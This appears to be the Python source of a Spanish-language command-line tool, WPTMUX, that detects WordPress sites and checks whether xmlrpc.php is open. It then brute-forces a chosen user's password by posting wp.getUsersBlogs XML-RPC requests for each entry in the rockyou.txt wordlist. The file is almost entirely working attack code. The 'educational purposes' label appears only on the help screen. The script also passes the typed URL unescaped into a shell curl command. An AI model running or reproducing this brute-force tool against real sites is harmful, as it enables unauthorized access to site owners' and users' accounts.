import os
import sys
import subprocess
import time
from colores import colorverde,colorazul,colorclasic,colormorado,colornaraja,coloramarillo
import random
import requests
while True:
 try:
  from bs4 import BeautifulSoup
  break
 except ModuleNotFoundError:
  os.system("pip install beautifulsoup4")

class color:
    morado = '\033[95m'
    blanco = '\033[97m'
    cyan = '\033[96m'
    azul  = '\033[94m'
    verde = '\033[92m'
    amarillo = '\033[93m'
    rojo = '\033[91m'
    fin = '\033[0m'

r= requests.get("https://raw.githubusercontent.com/Fenrir-00/WPTMUX/main/version.txt")
r=r.text
if r != "version=0.1\n":
 os.system("clear")
 print((color.rojo + ('HAY UNA NUEVA VERSION ACTUALIZA EL REPOSITORIO\n') * 20))
 time.sleep(5)

def cabecera():
 os.system("clear")
 print(f"""{color.cyan}

 ██╗       ██╗██████╗ ████████╗███╗   ███╗██╗   ██╗██╗  ██╗
 ██║  ██╗  ██║██╔══██╗╚══██╔══╝████╗ ████║██║   ██║╚██╗██╔╝
 ╚██╗████╗██╔╝██████╔╝   ██║   ██╔████╔██║██║   ██║ ╚███╔╝
  ████╔═████║ ██╔═══╝    ██║   ██║╚██╔╝██║██║   ██║ ██╔██╗
  ╚██╔╝ ╚██╔╝ ██║        ██║   ██║ ╚═╝ ██║╚██████╔╝██╔╝╚██╗
   ╚═╝   ╚═╝  ╚═╝        ╚═╝   ╚═╝     ╚═╝ ╚═════╝ ╚═╝  ╚═╝""")

def version():
 texto ="""
 |=======================================================|
 | Script by              : #FENRIR-00                   |
 | Version                : Version  0.1                 |
 | Follow me on Github    : https://github.com/Fenrir-00 |
 | Contact me on Telegram : @Ritorito1990                |
 ========================================================= """ 

 suerte = random.randint(0,5)
 if suerte == 0:
   coloramarillo(texto)
 elif suerte == 1:
   colorazul(texto)
 elif suerte == 2 :
   colorclasic(texto)
 elif suerte == 3 :
   colormorado(texto)
 elif suerte == 4 :
   colornaraja(texto)
 elif suerte == 5:
   colorverde(texto)

def incorrecto():
    os.system(f"{limpieza}")
    print(f"""{color.rojo}
 █████╗ ██████╗  █████╗ ██╗ █████╗ ███╗  ██╗
██╔══██╗██╔══██╗██╔══██╗██║██╔══██╗████╗ ██║
██║  ██║██████╔╝██║  ╚═╝██║██║  ██║██╔██╗██║
██║  ██║██╔═══╝ ██║  ██╗██║██║  ██║██║╚████║
╚█████╔╝██║     ╚█████╔╝██║╚█████╔╝██║ ╚███║
 ╚════╝ ╚═╝      ╚════╝ ╚═╝ ╚════╝ ╚═╝  ╚══╝
██╗███╗  ██╗ █████╗  █████╗ ██████╗ ██████╗
██║████╗ ██║██╔══██╗██╔══██╗██╔══██╗██╔══██╗
██║██╔██╗██║██║  ╚═╝██║  ██║██████╔╝██████╔╝
██║██║╚████║██║  ██╗██║  ██║██╔══██╗██╔══██╗
██║██║ ╚███║╚█████╔╝╚█████╔╝██║  ██║██║  ██║
╚═╝╚═╝  ╚══╝ ╚════╝  ╚════╝ ╚═╝  ╚═╝╚═╝  ╚═╝
███████╗ █████╗ ████████╗ █████╗
██╔════╝██╔══██╗╚══██╔══╝██╔══██╗
█████╗  ██║  ╚═╝   ██║   ███████║
██╔══╝  ██║  ██╗   ██║   ██╔══██║
███████╗╚█████╔╝   ██║   ██║  ██║
╚══════╝ ╚════╝    ╚═╝   ╚═╝  ╚═╝{color.fin}""")
    time.sleep(4)
    menu()

def menu():
    os.system("clear")
    cabecera()
    version()
    print(f"{color.morado}    ATAQUE WORDPRESS")
    print("")
    print(f"{color.verde}[1]ATACAR")
    print(f"{color.amarillo}[2]AYUDA")
    print(f"{color.rojo}[0]SALIR{color.fin}")
    eleccion =input(f"{color.cyan}ELIJE UN NUMERO >>{color.fin} ")
    if eleccion == "1" :
     wp()
    elif eleccion == "2" :
     ayuda()
    elif eleccion == "0" :
     os.system("clear")
     exit(0)
    else:
        incorrecto()

def wp():
 try:
  os.remove('log.log')
 except:
  pass
 cabecera()
 version()
 print(f"""
  {color.amarillo}EJEMPLO: https://www.ejemplo.com/

""")
 url = input(f"{color.cyan}INTRODUCE UNA URL >>{color.fin} ")
 response = requests.get(url)
 soup = BeautifulSoup(response.text, 'html.parser')
 if "wp-content" in str(soup) or "wp-includes" in str(soup):
     print()
     print(f"{color.verde}[✓]El SITIO TIENE  WORDPRESS.")
     url = url+"xmlrpc.php"
     response = requests.get(url)
     frase = "XML-RPC server accepts POST requests only."
     soup = BeautifulSoup(response.text, 'html.parser')
     if frase in soup.get_text():
         print("[✓]POSIBLE ATAQUE XMLRPC.PHP")
         print("[✓] "+(url))
         comando = f"curl -X POST {url} -d@enviar1.xlm"
         resultado = subprocess.check_output(comando, shell=True, text=True)
         mi_variable = "<value><string>wp.getUsersBlogs</string></value>"
         if "<value><string>wp.getUsersBlogs</string></value>" in resultado:
           print(f"{color.verde}[✓]<value><string>wp.getUsersBlogs</string></value>")
           print(f"{color.amarillo}[✓] PODEMOS PROCEDER AL ATAQUE")
           usuario = input(f"{color.cyan}INTRODUCE USUARIO PARA EMPEZAR ATAQUE >>{color.fin} ")
           print("USUARIO DE ATAQUE: "+(usuario))
           time.sleep(3)
           ataque(url,usuario)
         else:
           print(f"{color.rojo}[×]<value><string>wp.getUsersBlogs</string></value>")


     else:
         print()
         print(f"{color.rojo}[×]IMPOSIBLE ATAQUE XMLRPC.PHP{color.fin}")
 else:
     print()
     print(f"{color.rojo}[×]El sitio web no parece utilizar WordPress.{color.fin}")
 
def ayuda():
 cabecera()
 version()
 print(f"""

  {color.morado}         XLMRPC ATACK{color.verde}

[✓]  HERRAMIENTA CREADA CON FINES EDUCATIVOS.

[✓]  NOS AYUDA A DETECTAR SI UNA PAGINA TIENE WORDPRESS.

[✓]  BUSCA SI LA VULNERABILIDAD XMLRPC ESTA ACTIVA.

[✓]  TENDREMOS QUE ENCONTRAR EL USUARIO.

[✓]  PROCEDE A UN ATAQUE POR FUERZA BRUTA

""")
 input(f"{color.cyan} PULSA CUALQUIER TECLA PARA CONTINUAR >>>{color.fin}")
 menu()


def ataque(url,usuario):
 with open('rockyou.txt', 'r') as password_file:
     passwords = password_file.readlines()

 for password in passwords:
    xml_payload = f'''<?xml version="1.0" encoding="UTF-8"?>
    <methodCall>
    <methodName>wp.getUsersBlogs</methodName>
    <params>
    <param><value>{usuario}</value></param>
    <param><value>{password.strip()}</value></param>
    </params>
    </methodCall>
    '''

    with open('enviar.xml', 'w') as xml_file:
        xml_file.write(xml_payload)
    print(f"[+] Probamos con la contraseña {password.strip()}")
    response = requests.post(f'{url}', data=xml_payload)
    with open('log.log', 'a') as log_file:
        log_file.write(response.text + '\n')
    if "Please try again later." in response.text or "parse error. not well formed" in response.text:
     print(f"""
           {color.rojo}!!! ATAQUE DETECTADO  !!!""")
     exit(0)
    if 'Incorrect username or password.' not in response.text and 'Nombre de usuario o contraseña incorrectos.' not in response.text:
        print(f"[+] La contraseña para {usuario} es {password.strip()}")
        exit(0)
    time.sleep(1)
    os.remove('log.log')
    os.remove('enviar.xml')

menu()

